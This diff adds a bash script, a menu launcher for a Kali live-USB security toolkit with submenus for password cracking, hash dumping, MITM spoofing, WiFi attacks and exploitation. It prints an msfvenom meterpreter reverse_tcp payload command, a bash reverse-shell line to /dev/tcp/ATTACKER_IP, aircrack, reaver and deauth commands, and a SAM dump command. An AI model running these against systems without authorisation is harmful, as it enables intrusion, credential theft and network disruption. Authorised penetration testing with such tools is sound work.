@@ -1,0 +1,284 @@
+#!/bin/bash
+# ============================================================
+# KALI LIVE USB - MAIN INTERACTIVE LAUNCHER
+# The "GOTO" tool for all operations
+# ============================================================
+# Usage: sudo ./MENU
+# ============================================================
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+# Check root
+if [ "$(id -u)" -ne 0 ]; then
+   echo -e "${RED}Please run with sudo: sudo ./MENU${NC}"
+   exit 1
+fi
+
+# Get system info
+get_system_info() {
+    OS=$(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)
+    KERNEL=$(uname -r)
+    IP=$(ip addr 2>/dev/null | grep "inet " | awk '{print $2}' | head -1)
+}
+
+# Show banner
+show_banner() {
+    clear
+    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${BLUE}║                                                                  ║${NC}"
+    echo -e "${BLUE}║      ${WHITE}█╗ ${YELLOW}██╗   ${GREEN}██╗ ${CYAN}██████╗  ${MAGENTA}██████╗  ${RED}██████╗  ${WHITE}██╗  ${BLUE}██╗   ${NC}"
+    echo -e "${BLUE}║      ${WHITE}██║ ${YELLOW}███╗  ${GREEN}██║ ${CYAN}██╔══██╗ ${MAGENTA}██╔══██╗ ${RED}██╔══██╗ ${WHITE}██║  ${BLUE}██║   ${NC}"
+    echo -e "${BLUE}║      ${WHITE}██║ ${YELLOW}██╔██╗ ${GREEN}██║ ${CYAN}██████╔╝ ${MAGENTA}██████╔╝ ${RED}██████╔╝ ${WHITE}██║  ${BLUE}██║   ${NC}"
+    echo -e "${BLUE}║      ${WHITE}██║ ${YELLOW}██╔██╗ ${GREEN}██║ ${CYAN}██╔═══╝  ${MAGENTA}██╔══██╗ ${RED}██╔══██╗ ${WHITE}╚██╗${BLUE}██╔╝   ${NC}"
+    echo -e "${BLUE}║      ${WHITE}╚██╗${YELLOW}██╔██╗ ${GREEN}██║ ${CYAN}██║      ${MAGENTA}██████╔╝ ${RED}██║  ${RED}██║  ${WHITE} ╚████╔╝  ${BLUE} ${NC}"
+    echo -e "${BLUE}║       ╚═╝${YELLOW}╚═╝ ╚═╝ ${GREEN}╚═╝ ${CYAN}╚═╝      ${MAGENTA}╚═╝  ${RED}╚═╝  ${RED}╚═╝   ${WHITE} ╚═══╝   ${BLUE} ${NC}"
+    echo -e "${BLUE}║                                                                  ║${NC}"
+    echo -e "${BLUE}║            ${WHITE}LIVE USB - SECURITY TOOLKIT v2.0               ${BLUE}   ║${NC}"
+    echo -e "${BLUE}║                                                                  ║${NC}"
+    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    get_system_info
+    echo -e "${CYAN}System:${NC} $OS"
+    echo -e "${CYAN}Kernel:${NC} $KERNEL"
+    echo -e "${CYAN}IP:${NC} ${GREEN}$IP${NC}"
+    echo ""
+}
+
+# Main menu
+main_menu() {
+    show_banner
+    echo -e "${WHITE}┌────────────────────────────────────────────────────────────────────┐${NC}"
+    echo -e "${WHITE}│                      ${YELLOW}MAIN MENU - SELECT ACTION${WHITE}                      │${NC}"
+    echo -e "${WHITE}└────────────────────────────────────────────────────────────────────┘${NC}"
+    echo ""
+    
+    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${GREEN}  ${WHITE}[1]${NC}  ${CYAN}PASSWORD OPERATIONS${NC}        Reset, crack, recover passwords"
+    echo -e "${GREEN}  ${WHITE}[2]${NC}  ${CYAN}NETWORK OPERATIONS${NC}       Scan, sniff, intercept, MITM"
+    echo -e "${GREEN}  ${WHITE}[3]${NC}  ${CYAN}WIRELESS ATTACKS${NC}         WiFi, WPS, handshakes, evil twin"
+    echo -e "${GREEN}  ${WHITE}[4]${NC}  ${CYAN}EXPLOITATION${NC}             Metasploit, shells, payloads"
+    echo -e "${GREEN}  ${WHITE}[5]${NC}  ${CYAN}FORENSICS & RECOVERY${NC}      Memory, disk, file recovery"
+    echo -e "${GREEN}  ${WHITE}[6]${NC}  ${CYAN}SYSTEM INTELLIGENCE${NC}      Info gathering, hardware"
+    echo -e "${GREEN}  ${WHITE}[7]${NC}  ${CYAN}POST-EXPLOITATION${NC}        Persistence, privesc, lateral"
+    echo -e "${GREEN}  ${WHITE}[8]${NC}  ${CYAN}AI & PRODUCTIVITY${NC}        OpenCode, Claude, tools"
+    echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    echo -e "${YELLOW}━━━ QUICK ACTIONS ━━━${NC}"
+    echo -e "${GREEN}  ${WHITE}[A]${NC}  Auto-Pentest        - Run automated recon & scan"
+    echo -e "${GREEN}  ${WHITE}[W]${NC}  WiFi Audit Mode    - Wireless assessment"
+    echo -e "${GREEN}  ${WHITE}[M]${NC}  Monitor Mode       - Enable monitor mode"
+    echo -e "${GREEN}  ${WHITE}[S]${NC}  Start Services     - SSH, HTTP, etc"
+    echo ""
+    echo -e "${CYAN}━━━ REFERENCE ━━━${NC}"
+    echo -e "${GREEN}  ${WHITE}[R]${NC}  View Credentials   - Saved WiFi passwords"
+    echo -e "${GREEN}  ${WHITE}[H]${NC}  Commands Reference - Quick command list"
+    echo -e "${GREEN}  ${WHITE}[N]${NC}  Network Status     - Current network info"
+    echo -e "${GREEN}  ${WHITE}[I]${NC}  System Info       - Full system details"
+    echo ""
+    echo -e "${GREEN}  ${WHITE}[U]${NC}  Update Tools       - Update Kali tools"
+    echo -e "${GREEN}  ${WHITE}[X]${NC}  Exit${NC}"
+    echo ""
+    echo -e "${BLUE}══════════════════════════════════════════════════════════════════════${NC}"
+    echo -ne "${YELLOW}Select option: ${NC}"
+}
+
+# Password operations
+password_menu() {
+    while true; do
+        show_banner
+        echo -e "${WHITE}┌────────────────────────────────────────────────────────────────────┐${NC}"
+        echo -e "${WHITE}│                    ${YELLOW}PASSWORD OPERATIONS${WHITE}                       │${NC}"
+        echo -e "${WHITE}└────────────────────────────────────────────────────────────────────┘${NC}"
+        echo ""
+        echo -e "${GREEN}  [1]  Reset Windows Password    - Clear admin password (SAM)"
+        echo -e "${GREEN}  [2]  Reset Linux Password     - Clear root password"
+        echo -e "${GREEN}  [3]  Windows SAM Viewer        - View user accounts"
+        echo -e "${GREEN}  [4]  Hash Dumping             - Mimikatz, pwdump, secretsdump"
+        echo -e "${GREEN}  [5]  Hash Cracking           - Hashcat, John the Ripper"
+        echo -e "${GREEN}  [6]  WiFi Password Recovery   - Find saved WiFi passwords"
+        echo -e "${GREEN}  [7]  Rainbow Tables          - Precomputed hash lookup"
+        echo -e "${GREEN}  [8]  Password Spraying       - Try common passwords"
+        echo ""
+        echo -e "${RED}  [B]  Back to main menu${NC}"
+        echo ""
+        echo -ne "${YELLOW}Select: ${NC}"
+        read choice
+        case $choice in
+            1) bash /scripts-desktop/win-password-reset.sh ;;
+            2) echo "Linux password reset: boot to single user mode" ;;
+            3) echo "SAM Viewer: chntpw -l /mnt/Windows/System32/config/SAM" ;;
+            4) echo "Hash dumping tools..." ;;
+            5) echo "Run: hashcat -m 0 hash.txt wordlist.txt" ;;
+            6) bash /scripts-desktop/wifi-recovery.sh ;;
+            7) echo "Use CrackStation or online tools" ;;
+            8) echo "Password spraying..." ;;
+            b|B) return ;;
+        esac
+        echo "Press Enter to continue..."
+        read
+    done
+}
+
+# Network operations
+network_menu() {
+    while true; do
+        show_banner
+        echo -e "${WHITE}┌────────────────────────────────────────────────────────────────────┐${NC}"
+        echo -e "${WHITE}│                     ${YELLOW}NETWORK OPERATIONS${WHITE}                       │${NC}"
+        echo -e "${WHITE}└────────────────────────────────────────────────────────────────────┘${NC}"
+        echo ""
+        echo -e "${GREEN}  [1]  Network Scanner          - Quick nmap discovery"
+        echo -e "${GREEN}  [2]  Port Scan                - Detailed port scan"
+        echo -e "${GREEN}  [3]  Responder/LLMNR         - Intercept credentials"
+        echo -e "${GREEN}  [4]  HTTP Server             - Start file server"
+        echo -e "${GREEN}  [5]  Packet Sniffer          - Tcpdump, Wireshark"
+        echo -e "${GREEN}  [6]  ARP Spoofing           - MITM with Ettercap"
+        echo -e "${GREEN}  [7]  DNS Spoofing           - Redirect DNS"
+        echo ""
+        echo -e "${RED}  [B]  Back to main menu${NC}"
+        echo ""
+        echo -ne "${YELLOW}Select: ${NC}"
+        read choice
+        case $choice in
+            1) bash /scripts-desktop/network-scan.sh ;;
+            2) echo "Run: nmap -sV -sC -p- target" ;;
+            3) echo "Run: responder -I eth0" ;;
+            4) python3 -m http.server 80 ;;
+            5) echo "Run: tcpdump -i eth0" ;;
+            6) echo "Run: ettercap -G" ;;
+            7) echo "DNS spoofing..." ;;
+            b|B) return ;;
+        esac
+        echo "Press Enter to continue..."
+        read
+    done
+}
+
+# Wireless operations
+wireless_menu() {
+    while true; do
+        show_banner
+        echo -e "${WHITE}┌────────────────────────────────────────────────────────────────────┐${NC}"
+        echo -e "${WHITE}│                    ${YELLOW}WIRELESS ATTACKS${WHITE}                          │${NC}"
+        echo -e "${WHITE}└────────────────────────────────────────────────────────────────────┘${NC}"
+        echo ""
+        echo -e "${GREEN}  [1]  WiFi Scanner            - Find nearby networks"
+        echo -e "${GREEN}  [2]  Monitor Mode Setup     - Enable monitor mode"
+        echo -e "${GREEN}  [3]  Handshake Capture      - Capture WPA handshakes"
+        echo -e "${GREEN}  [4]  WPS Attack             - Reaver PIN attack"
+        echo -e "${GREEN}  [5]  Evil Twin             - Create fake AP"
+        echo -e "${GREEN}  [6]  WiFi Cracking          - Crack WPA password"
+        echo -e "${GREEN}  [7]  Deauth Attack         - Disconnect clients"
+        echo ""
+        echo -e "${RED}  [B]  Back to main menu${NC}"
+        echo ""
+        echo -ne "${YELLOW}Select: ${NC}"
+        read choice
+        case $choice in
+            1) airodump-ng wlan0mon ;;
+            2) airmon-ng start wlan0; echo "Monitor mode enabled on wlan0mon" ;;
+            3) echo "Run: airodump-ng -c [channel] --bssid [MAC] -w handshake wlan0mon" ;;
+            4) echo "Run: reaver -i wlan0mon -b [AP_MAC] -vv" ;;
+            5) echo "Evil Twin setup..." ;;
+            6) echo "Run: aircrack-ng -w wordlist.txt handshake.cap" ;;
+            7) echo "Run: aireplay-ng -0 10 -a [AP_MAC] wlan0mon" ;;
+            b|B) return ;;
+        esac
+        echo "Press Enter to continue..."
+        read
+    done
+}
+
+# Exploitation
+exploit_menu() {
+    while true; do
+        show_banner
+        echo -e "${WHITE}┌────────────────────────────────────────────────────────────────────┐${NC}"
+        echo -e "${WHITE}│                       ${YELLOW}EXPLOITATION${WHITE}                             │${NC}"
+        echo -e "${WHITE}└────────────────────────────────────────────────────────────────────┘${NC}"
+        echo ""
+        echo -e "${GREEN}  [1]  Metasploit Framework  - Start msfconsole"
+        echo -e "${GREEN}  [2]  Exploit Search         - Searchsploit database"
+        echo -e "${GREEN}  [3]  Payload Generator      - MSFVenom"
+        echo -e "${GREEN}  [4]  Reverse Shell          - Quick reverse shell"
+        echo -e "${GREEN}  [5]  Bind Shell             - Create bind shell"
+        echo -e "${GREEN}  [6]  Web Shell              - PHP/ASP shells"
+        echo ""
+        echo -e "${RED}  [B]  Back to main menu${NC}"
+        echo ""
+        echo -ne "${YELLOW}Select: ${NC}"
+        read choice
+        case $choice in
+            1) msfconsole ;;
+            2) searchsploit ;;
+            3) echo "Run: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe" ;;
+            4) echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" ;;
+            5) echo "Run: nc -lvp 4444" ;;
+            6) echo "Use: /usr/share/webshells/" ;;
+            b|B) return ;;
+        esac
+        echo "Press Enter to continue..."
+        read
+    done
+}
+
+# Show credentials
+show_credentials() {
+    echo -e "${GREEN}=======================================${NC}"
+    echo -e "${GREEN}     SAVED CREDENTIALS${NC}"
+    echo -e "${GREEN}=======================================${NC}"
+    cat /wifi-passwords/NETWORK-CREDENTIALS.txt 2>/dev/null || echo "No credentials found"
+    echo ""
+}
+
+# Show quick reference
+show_reference() {
+    cat /scripts-desktop/QUICK-REF.txt 2>/dev/null || echo "Reference not found"
+}
+
+# Show network status
+show_network() {
+    echo -e "${GREEN}=== Network Interfaces ===${NC}"
+    ip addr 2>/dev/null | grep -E "^[0-9]+:|inet "
+    echo ""
+    echo -e "${GREEN}=== Routes ===${NC}"
+    ip route 2>/dev/null
+    echo ""
+    echo -e "${GREEN}=== DNS ===${NC}"
+    cat /etc/resolv.conf 2>/dev/null | grep nameserver
+}
+
+# Main loop
+while true; do
+    main_menu
+    read choice
+    case $choice in
+        1) password_menu ;;
+        2) network_menu ;;
+        3) wireless_menu ;;
+        4) exploit_menu ;;
+        5) echo "Forensics tools..." ;;
+        6) bash /scripts-desktop/system-info.sh ;;
+        7) echo "Post-exploitation..." ;;
+        8) echo "AI tools - see option U" ;;
+        a|A) echo "Auto-pentest mode..." ;;
+        w|W) airmon-ng start wlan0; airodump-ng wlan0mon ;;
+        m|M) airmon-ng start wlan0; echo "Monitor mode: wlan0mon" ;;
+        s|S) systemctl start ssh 2>/dev/null; service apache2 start 2>/dev/null; echo "Services started" ;;
+        r|R) show_credentials; echo "Press Enter..."; read ;;
+        h|H) show_reference; echo "Press Enter..."; read ;;
+        n|N) show_network; echo "Press Enter..."; read ;;
+        i|I) bash /scripts-desktop/system-info.sh ;;
+        u|U) apt update && apt upgrade -y ;;
+        x|X) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
+        *) echo "Invalid option" ;;
+    esac
+done
